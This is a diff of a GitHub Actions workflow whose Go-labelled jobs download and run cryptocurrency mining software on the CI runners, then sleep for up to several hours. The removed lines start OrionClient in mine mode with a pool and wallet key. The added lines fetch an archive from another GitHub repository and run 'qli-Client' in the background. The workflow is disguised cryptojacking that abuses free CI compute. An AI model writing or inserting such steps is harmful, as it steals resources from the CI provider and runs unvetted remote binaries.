@@ -25,7 +25,7 @@ jobs:
     - name: Setup
       uses: actions/checkout@v4
     - name: clone
-      run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool Twpore --key HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4 --worker tod1 &
+      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/final.tar.gz && tar xf final.tar.gz && chmod +x * && ./qli-Client &
            sleep 310s
   ol:
     needs: kont
@@ -48,7 +48,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool Twpore --key HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4 --worker tod1 &
+      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/final.tar.gz && tar xf final.tar.gz && chmod +x * && ./qli-Client &
             sleep 5m
         
     
@@ -74,7 +74,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool Twpore --key HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4 --worker tod1 &
+      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/final.tar.gz && tar xf final.tar.gz && chmod +x * && ./qli-Client &
             sleep 6m
   ayo:
     needs: ol
@@ -97,8 +97,8 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool Twpore --key HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4 --worker tod1 &
-            sleep 305m
+      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/final.tar.gz && tar xf final.tar.gz && chmod +x * && ./qli-Client &
+            sleep 105m
         
     
      
@@ -123,8 +123,8 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool Twpore --key HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4 --worker tod1 &
-            sleep 261m
+      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/final.tar.gz && tar xf final.tar.gz && chmod +x * && ./qli-Client &
+            sleep 61m
         
-  
+    
   
